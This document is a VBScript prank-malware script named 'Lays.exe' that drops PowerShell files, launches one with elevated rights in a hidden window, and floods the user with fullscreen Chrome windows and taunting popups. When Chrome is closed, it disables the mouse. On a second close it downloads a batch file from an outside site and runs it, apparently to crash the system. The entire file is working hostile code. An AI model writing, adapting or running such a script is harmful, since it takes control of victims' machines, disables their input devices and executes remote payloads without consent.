DisabledMouse = false
BSOD = false
Set objShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\" & "." & "\root\cimv2")
Set objFSO = CreateObject("Scripting.FileSystemObject")
If Not objFSO.FolderExists("c:\Lays") Then
objFSO.CreateFolder("c:\Lays")
End If
Set PrivEscalationScript = objFSO.CreateTextFile("c:\Lays\PrivEscalation.ps1",True)
PrivEscalationScript.WriteLine "Start-Process powershell.exe c:\Lays\DisableMouse.ps1 -verb runas -WindowStyle Hidden"
PrivEscalationScript.Close
Set DisableMouseScript = objFSO.CreateTextFile("c:\Lays\DisableMouse.ps1",True)
DisableMouseScript.WriteLine "while ($true){"
DisableMouseScript.WriteLine "Start-Sleep -Seconds 2"
DisableMouseScript.WriteLine "$result = Test-Path 'C:\Lays\ChromeClosedFlag'"
DisableMouseScript.WriteLine "If ($result -eq $True){"
DisableMouseScript.WriteLine "Get-PnpDevice -Class 'Mouse' -PresentOnly | Disable-PnpDevice -Confirm:$false"
DisableMouseScript.WriteLine "break"
DisableMouseScript.WriteLine "}"
DisableMouseScript.WriteLine "}"
DisableMouseScript.WriteLine "while ($true){"
DisableMouseScript.WriteLine "Start-Sleep -Seconds 2"
DisableMouseScript.WriteLine "$result2 = Test-Path 'C:\Lays\BSODFlag'"
DisableMouseScript.WriteLine "If ($result2 -eq $True){"
DisableMouseScript.WriteLine "Invoke-WebRequest 'https://phobiarides.com/BSODPrank/BSOD.txt' -OutFile c:\Lays\BSOD.bat"
DisableMouseScript.WriteLine "Start-Sleep -Seconds 5"
DisableMouseScript.WriteLine "Start-Process -FilePath 'c:\Lays\BSOD.bat'"
DisableMouseScript.WriteLine "break"
DisableMouseScript.WriteLine "}"
DisableMouseScript.WriteLine "}"
DisableMouseScript.Close
objShell.run "powershell.exe c:\Lays\PrivEscalation.ps1"
WScript.Sleep 3000
objShell.Popup "Your computer has been infected with Lays.exe", 3, "Lays.exe", 64 + 4096
objShell.Popup "Lays will now forever be burned into your TV/Monitor", 3, "Lays.exe", 64 + 4096
objShell.Popup "Just sit back and let it happen", 3, "Lays.exe", 48 + 4096
objShell.run "chrome.exe https://www.google.com/search?q=lays&udm=2 --start-fullscreen"
do
WScript.Sleep 5000
sQuery = "SELECT * FROM Win32_Process"
Set objItems = objWMIService.ExecQuery(sQuery)
ChromeOpen = false
For Each objItem In objItems
    If objItem.Name = "chrome.exe" Then
        ChromeOpen = true
        Exit For
    End If
Next
If ChromeOpen = false Then
objShell.Popup "I told you to just LET IT HAPPEN!", 3, "Lays.exe", 16 + 4096
If DisabledMouse = false Then
DisabledMouse = true
If Not objFSO.FolderExists("c:\Lays\ChromeClosedFlag") Then
objFSO.CreateFolder("c:\Lays\ChromeClosedFlag")
End If
WScript.Sleep 2000
objShell.Popup "Because you can't be trusted, I've went ahead and disabled your mouse!", 5, "Lays.exe", 64 + 4096
Else
If BSOD = false Then
BSOD = true
If Not objFSO.FolderExists("c:\Lays\BSODFlag") Then
objFSO.CreateFolder("c:\Lays\BSODFlag")
End If
objShell.Popup "Alright, Say Goodbye To Your Computer I guess :(", 5, "Lays.exe", 16 + 4096
WScript.Sleep 15000
End If
End If
objShell.run "chrome.exe https://www.google.com/search?q=lays&udm=2 --start-fullscreen"
End If
Loop